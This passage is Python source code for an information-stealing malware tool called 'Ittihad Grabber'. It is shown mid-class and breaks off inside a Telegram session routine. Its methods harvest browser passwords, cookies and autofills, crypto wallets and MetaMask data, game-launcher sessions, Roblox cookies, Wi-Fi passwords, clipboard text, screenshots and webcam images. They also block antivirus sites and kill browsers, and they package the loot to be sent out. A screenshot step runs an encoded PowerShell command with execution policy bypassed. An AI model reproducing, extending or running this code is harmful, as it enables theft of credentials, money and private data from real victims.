    EpicStolen: bool = False
    UplayStolen: bool = False
    GrowtopiaStolen: bool = False

    def __init__(self) -> None:
        self.Separator = '\n\n' + 'Ittihad Grabber'.center(50, '=') + '\n\n'
        while True:
            self.ArchivePath = os.path.join(os.getenv('temp'), Utility.GetRandomString() + '.zip')
            if not os.path.isfile(self.ArchivePath):
                break
        Logger.info('Creating temporary folder')
        while True:
            self.TempFolder = os.path.join(os.getenv('temp'), Utility.GetRandomString(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok=True)
                break
        for func, daemon in ((self.StealBrowserData, False), (self.StealDiscordTokens, False), (self.StealTelegramSessions, False), (self.StealWallets, False), (self.StealMinecraft, False), (self.StealEpic, False), (self.StealGrowtopia, False), (self.StealSteam, False), (self.StealUplay, False), (self.GetAntivirus, False), (self.GetClipboard, False), (self.GetTaskList, False), (self.GetDirectoryTree, False), (self.GetWifiPasswords, False), (self.StealSystemInfo, False), (self.BlockSites, False), (self.TakeScreenshot, True), (self.Webshot, True), (self.StealCommonFiles, True)):
            thread = Thread(target=func, daemon=daemon)
            thread.start()
            Tasks.AddTask(thread)
        Tasks.WaitForAll()
        Logger.info('All functions ended')
        if Errors.errors:
            try:
                with open(os.path.join(self.TempFolder, 'Errors.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write('# This file contains the errors handled successfully during the functioning of the stealer.' + '\n\n' + '=' * 50 + '\n\n' + ('\n\n' + '=' * 50 + '\n\n').join(Errors.errors))
            except Exception:
                pass
        self.SendData()
        try:
            Logger.info('Removing archive')
            os.remove(self.ArchivePath)
            Logger.info('Removing temporary folder')
            shutil.rmtree(self.TempFolder)
        except Exception:
            pass

    @Errors.Catch
    def StealCommonFiles(self) -> None:
        if Settings.CaptureCommonFiles:
            for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                if os.path.isdir(dir):
                    file: str
                    for file in os.listdir(dir):
                        if os.path.isfile(os.path.join(dir, file)):
                            if (any([x in file.lower() for x in ('secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup')]) or file.endswith(('.txt', '.doc', '.docx', '.png', '.pdf', '.jpg', '.jpeg', '.csv', '.mp3', '.mp4', '.xls', '.xlsx'))) and os.path.getsize(os.path.join(dir, file)) < 2 * 1024 * 1024:
                                try:
                                    os.makedirs(os.path.join(self.TempFolder, 'Common Files', name), exist_ok=True)
                                    shutil.copy(os.path.join(dir, file), os.path.join(self.TempFolder, 'Common Files', name, file))
                                    self.CommonFilesCount += 1
                                except Exception:
                                    pass

    @Errors.Catch
    def StealMinecraft(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Minecraft related files')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Minecraft')
            userProfile = os.getenv('userprofile')
            roaming = os.getenv('appdata')
            minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'), 'Feather': os.path.join(roaming, '.feather', 'accounts.json'), 'Meteor': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'), 'Impact': os.path.join(roaming, '.minecraft', 'Impact', 'alts.json'), 'Novoline': os.path.join(roaming, '.minectaft', 'Novoline', 'alts.novo'), 'CheatBreakers': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json'), 'Microsoft Store': os.path.join(roaming, '.minecraft', 'launcher_accounts_microsoft_store.json'), 'Rise': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'), 'Rise (Intent)': os.path.join(userProfile, 'intentlauncher', 'Rise', 'alts.txt'), 'Paladium': os.path.join(roaming, 'paladium-group', 'accounts.json'), 'PolyMC': os.path.join(roaming, 'PolyMC', 'accounts.json'), 'Badlion': os.path.join(roaming, 'Badlion Client', 'accounts.json')}
            for name, path in minecraftPaths.items():
                if os.path.isfile(path):
                    try:
                        os.makedirs(os.path.join(saveToPath, name), exist_ok=True)
                        shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                        self.MinecraftSessions += 1
                    except Exception:
                        continue

    @Errors.Catch
    def StealGrowtopia(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Growtopia session')
            try:
                growtopiadirs = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Growtopia')] if x is not None])]
                saveToPath = os.path.join(self.TempFolder, 'Games', 'Growtopia')
                multiple = len(growtopiadirs) > 1
                for index, path in enumerate(growtopiadirs):
                    targetFilePath = os.path.join(path, 'save.dat')
                    if os.path.isfile(targetFilePath):
                        try:
                            _saveToPath = saveToPath
                            if multiple:
                                _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
                            os.makedirs(_saveToPath, exist_ok=True)
                            shutil.copy(targetFilePath, os.path.join(_saveToPath, 'save.dat'))
                            self.GrowtopiaStolen = True
                        except Exception:
                            try:
                                shutil.rmtree(_saveToPath)
                            except Exception:
                                pass
                if multiple and self.GrowtopiaStolen:
                    with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                        file.write('Multiple Growtopia installations are found, so the files for each of them are put in different Profiles')
            except Exception:
                pass

    @Errors.Catch
    def StealEpic(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Epic session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Epic')
            epicPath = os.path.join(os.getenv('localappdata'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
                if os.path.isfile(loginFile):
                    try:
                        with open(loginFile) as file:
                            contents = file.read()
                        if '[RememberMe]' in contents:
                            os.makedirs(saveToPath, exist_ok=True)
                            for file in os.listdir(epicPath):
                                if os.path.isfile(os.path.join(epicPath, file)):
                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
                            shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                            self.EpicStolen = True
                    except Exception:
                        pass

    @Errors.Catch
    def StealSteam(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Steam session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Steam')
            try:
                steamPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Steam')] if x is not None])]
                multiple = len(steamPaths) > 1
                if not steamPaths:
                    steamPaths.append('C:\\Program Files (x86)\\Steam')
                for index, steamPath in enumerate(steamPaths):
                    steamConfigPath = os.path.join(steamPath, 'config')
                    if os.path.isdir(steamConfigPath):
                        loginFile = os.path.join(steamConfigPath, 'loginusers.vdf')
                        if os.path.isfile(loginFile):
                            with open(loginFile) as file:
                                contents = file.read()
                            if '"RememberPassword"\t\t"1"' in contents:
                                try:
                                    _saveToPath = saveToPath
                                    if multiple:
                                        _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
                                    os.makedirs(_saveToPath, exist_ok=True)
                                    shutil.copytree(steamConfigPath, os.path.join(_saveToPath, 'config'), dirs_exist_ok=True)
                                    for item in os.listdir(steamPath):
                                        if item.startswith('ssfn') and os.path.isfile(os.path.join(steamPath, item)):
                                            shutil.copy(os.path.join(steamPath, item), os.path.join(_saveToPath, item))
                                            self.SteamStolen = True
                                except Exception:
                                    pass
                if self.SteamStolen and multiple:
                    with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                        file.write('Multiple Steam installations are found, so the files for each of them are put in different Profiles')
            except Exception:
                pass

    @Errors.Catch
    def StealUplay(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Uplay session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Uplay')
            uplayPath = os.path.join(os.getenv('localappdata'), 'Ubisoft Game Launcher')
            if os.path.isdir(uplayPath):
                for item in os.listdir(uplayPath):
                    if os.path.isfile(os.path.join(uplayPath, item)):
                        try:
                            os.makedirs(saveToPath, exist_ok=True)
                            shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
                            self.UplayStolen = True
                        except Exception:
                            pass

    @Errors.Catch
    def StealRobloxCookies(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Roblox cookies')
            saveToDir = os.path.join(self.TempFolder, 'Games', 'Roblox')
            note = '# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not.'
            cookies = []
            browserCookies = '\n'.join(self.Cookies)
            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', browserCookies):
                cookies.append(match)
            output = list()
            for item in ('HKCU', 'HKLM'):
                try:
                    process = subprocess.run('powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'.format(item), capture_output=True, shell=True)
                    if not process.returncode:
                        output.append(process.stdout.decode(errors='ignore'))
                except Exception:
                    pass
            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', '\n'.join(output)):
                cookies.append(match)
            cookies = [*set(cookies)]
            if cookies:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Roblox Cookies.txt'), 'w') as file:
                    file.write('{}{}{}'.format(note, self.Separator, self.Separator.join(cookies)))
                self.RobloxCookiesCount += len(cookies)

    @Errors.Catch
    def StealWallets(self) -> None:
        if Settings.CaptureWallets:
            Logger.info('Stealing crypto wallets')
            saveToDir = os.path.join(self.TempFolder, 'Wallets')
            wallets = (('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')), ('Armory', os.path.join(os.getenv('appdata'), 'Armory')), ('Bytecoin', os.path.join(os.getenv('appdata'), 'Bytecoin')), ('Jaxx', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(os.getenv('appdata'), 'Ethereum', 'keystore')), ('Electrum', os.path.join(os.getenv('appdata'), 'Electrum', 'wallets')), ('AtomicWallet', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets')))
            browserPaths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')}
            for name, path in wallets:
                if os.path.isdir(path):
                    _saveToDir = os.path.join(saveToDir, name)
                    try:
                        os.makedirs(_saveToDir, exist_ok=True)
                        shutil.copytree(path, os.path.join(_saveToDir, os.path.basename(path)), dirs_exist_ok=True)
                        with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                            file.write(path)
                        self.WalletsCount += 1
                    except Exception:
                        try:
                            shutil.rmtree(_saveToDir)
                        except Exception:
                            pass
            for name, path in browserPaths.items():
                if os.path.isdir(path):
                    for root, dirs, _ in os.walk(path):
                        for _dir in dirs:
                            if _dir == 'Local Extension Settings':
                                localExtensionsSettingsDir = os.path.join(root, _dir)
                                for _dir in ('ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn'):
                                    extentionPath = os.path.join(localExtensionsSettingsDir, _dir)
                                    if os.path.isdir(extentionPath) and os.listdir(extentionPath):
                                        try:
                                            metamask_browser = os.path.join(saveToDir, 'Metamask ({})'.format(name))
                                            _saveToDir = os.path.join(metamask_browser, _dir)
                                            shutil.copytree(extentionPath, _saveToDir, dirs_exist_ok=True)
                                            with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                                                file.write(extentionPath)
                                            self.WalletsCount += 1
                                        except Exception:
                                            try:
                                                shutil.rmtree(_saveToDir)
                                                if not os.listdir(metamask_browser):
                                                    shutil.rmtree(metamask_browser)
                                            except Exception:
                                                pass

    @Errors.Catch
    def StealSystemInfo(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Stealing system information')
            saveToDir = os.path.join(self.TempFolder, 'System')
            try:
                process = subprocess.run('systeminfo', capture_output=True, shell=True)
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
                if output:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'System Info.txt'), 'w') as file:
                        file.write(output)
                    self.SystemInfoStolen = True
            except Exception:
                pass
            try:
                process = subprocess.run('getmac', capture_output=True, shell=True)
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
                if output:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'MAC Addresses.txt'), 'w') as file:
                        file.write(output)
                    self.SystemInfoStolen = True
            except Exception:
                pass

    @Errors.Catch
    def GetDirectoryTree(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting directory trees')
            PIPE = chr(9474) + '   '
            TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
            ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
            output = {}
            for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                if os.path.isdir(dir):
                    try:
                        dircontent: list = os.listdir(dir)
                        if 'desltop.ini' in dircontent:
                            dircontent.remove('desktop.ini')
                        if dircontent:
                            process = subprocess.run('tree /A /F', shell=True, capture_output=True, cwd=dir)
                            if process.returncode == 0:
                                output[name] = (name + '\n' + '\n'.join(process.stdout.decode(errors='ignore').splitlines()[3:])).replace('|   ', PIPE).replace('+---', TEE).replace('\\---', ELBOW)
                    except Exception:
                        pass
            for key, value in output.items():
                try:
                    os.makedirs(os.path.join(self.TempFolder, 'Directories'), exist_ok=True)
                    with open(os.path.join(self.TempFolder, 'Directories', '{}.txt'.format(key)), 'w', encoding='utf-8') as file:
                        file.write(value)
                    self.SystemInfoStolen = True
                except Exception:
                    pass

    @Errors.Catch
    def GetClipboard(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting clipboard text')
            saveToDir = os.path.join(self.TempFolder, 'System')
            try:
                process = subprocess.run('powershell Get-Clipboard', shell=True, capture_output=True)
                if process.returncode == 0:
                    content = process.stdout.decode(errors='ignore').strip()
                    if content:
                        os.makedirs(saveToDir, exist_ok=True)
                        with open(os.path.join(saveToDir, 'Clipboard.txt'), 'w', encoding='utf-8') as file:
                            file.write(content)
            except Exception:
                pass

    @Errors.Catch
    def GetAntivirus(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting antivirus')
            saveToDir = os.path.join(self.TempFolder, 'System')
            try:
                process = subprocess.run('WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', shell=True, capture_output=True)
                if process.returncode == 0:
                    output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n').splitlines()
                    if len(output) >= 2:
                        output = output[1:]
                        os.makedirs(saveToDir, exist_ok=True)
                        with open(os.path.join(saveToDir, 'Antivirus.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                            file.write('\n'.join(output))
            except Exception:
                pass

    @Errors.Catch
    def GetTaskList(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting task list')
            saveToDir = os.path.join(self.TempFolder, 'System')
            try:
                process = subprocess.run('tasklist /FO LIST', capture_output=True, shell=True)
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
                if output:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Task List.txt'), 'w', errors='ignore') as tasklist:
                        tasklist.write(output)
            except Exception:
                pass

    @Errors.Catch
    def GetWifiPasswords(self) -> None:
        if Settings.CaptureWifiPasswords:
            Logger.info('Getting wifi passwords')
            saveToDir = os.path.join(self.TempFolder, 'System')
            try:
                passwords = Utility.GetWifiPasswords()
                profiles = list()
                for profile, psw in passwords.items():
                    profiles.append(f'Network: {profile}\nPassword: {psw}')
                if profiles:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Wifi Networks.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                        file.write(self.Separator.lstrip() + self.Separator.join(profiles))
                    self.WifiPasswordsCount += len(profiles)
            except Exception:
                pass

    @Errors.Catch
    def TakeScreenshot(self) -> None:
        if Settings.CaptureScreenshot:
            Logger.info('Taking screenshot')
            command = 'JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA='
            try:
                if subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', command], shell=True, capture_output=True, cwd=self.TempFolder).returncode == 0:
                    self.ScreenshotTaken = True
            except Exception:
                pass

    @Errors.Catch
    def BlockSites(self) -> None:
        if Settings.BlockAvSites:
            Logger.info('Blocking AV sites')
            Utility.BlockSites()
            Utility.TaskKill('chrome', 'firefox', 'msedge', 'safari', 'opera', 'iexplore')

    @Errors.Catch
    def StealBrowserData(self) -> None:
        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory or Settings.CaptureAutofills)):
            return
        Logger.info('Stealing browser data')
        threads: list[Thread] = []
        paths = {'Brave': (os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'brave'), 'Chrome': (os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'chrome'), 'Chromium': (os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'chromium'), 'Comodo': (os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'comodo'), 'Edge': (os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'msedge'), 'EpicPrivacy': (os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'epic'), 'Iridium': (os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'iridium'), 'Opera': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'opera'), 'Opera GX': (os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'operagx'), 'Slimjet': (os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'slimjet'), 'UR': (os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'urbrowser'), 'Vivaldi': (os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'vivaldi'), 'Yandex': (os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data'), 'yandex')}
        for name, item in paths.items():
            path, procname = item
            if os.path.isdir(path):

                def run(name, path):
                    try:
                        Utility.TaskKill(procname)
                        browser = Browsers.Chromium(path)
                        saveToDir = os.path.join(self.TempFolder, 'Credentials', name)
                        passwords = browser.GetPasswords() if Settings.CapturePasswords else None
                        cookies = browser.GetCookies() if Settings.CaptureCookies else None
                        history = browser.GetHistory() if Settings.CaptureHistory else None
                        autofills = browser.GetAutofills() if Settings.CaptureAutofills else None
                        if passwords or cookies or history or autofills:
                            os.makedirs(saveToDir, exist_ok=True)
                            if passwords:
                                output = ['URL: {}\nUsername: {}\nPassword: {}'.format(*x) for x in passwords]
                                with open(os.path.join(saveToDir, '{} Passwords.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.PasswordsCount += len(passwords)
                            if cookies:
                                output = ['{}\t{}\t{}\t{}\t{}\t{}\t{}'.format(host, str(expiry != 0).upper(), cpath, str(not host.startswith('.')).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
                                with open(os.path.join(saveToDir, '{} Cookies.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write('\n'.join(output))
                                self.Cookies.extend([str(x[3]) for x in cookies])
                            if history:
                                output = ['URL: {}\nTitle: {}\nVisits: {}'.format(*x) for x in history]
                                with open(os.path.join(saveToDir, '{} History.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(self.Separator.lstrip() + self.Separator.join(output))
                                self.HistoryCount += len(history)
                            if autofills:
                                output = '\n'.join(autofills)
                                with open(os.path.join(saveToDir, '{} Autofills.txt'.format(name)), 'w', errors='ignore', encoding='utf-8') as file:
                                    file.write(output)
                                self.AutofillCount += len(autofills)
                    except Exception:
                        pass
                t = Thread(target=run, args=(name, path))
                t.start()
                threads.append(t)
        for thread in threads:
            thread.join()
        if Settings.CaptureGames:
            self.StealRobloxCookies()

    @Errors.Catch
    def Webshot(self) -> None:
        if Settings.CaptureWebcam:
            try:
                camdir = os.path.join(self.TempFolder, 'Webcam')
                os.makedirs(camdir, exist_ok=True)
                camIndex = 0
                while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, 'Webcam (%d).bmp' % (camIndex + 1))):
                    camIndex += 1
                    self.WebcamPicturesCount += 1
                if self.WebcamPicturesCount == 0:
                    shutil.rmtree(camdir)
            except Exception:
                pass

    @Errors.Catch
    def StealTelegramSessions(self) -> None:
        if Settings.CaptureTelegram:
            Logger.info('Stealing telegram sessions')
            try:
                telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Telegram')] if x is not None])]
                multiple = len(telegramPaths) > 1
                saveToDir = os.path.join(self.TempFolder, 'Messenger', 'Telegram')
                if not telegramPaths:
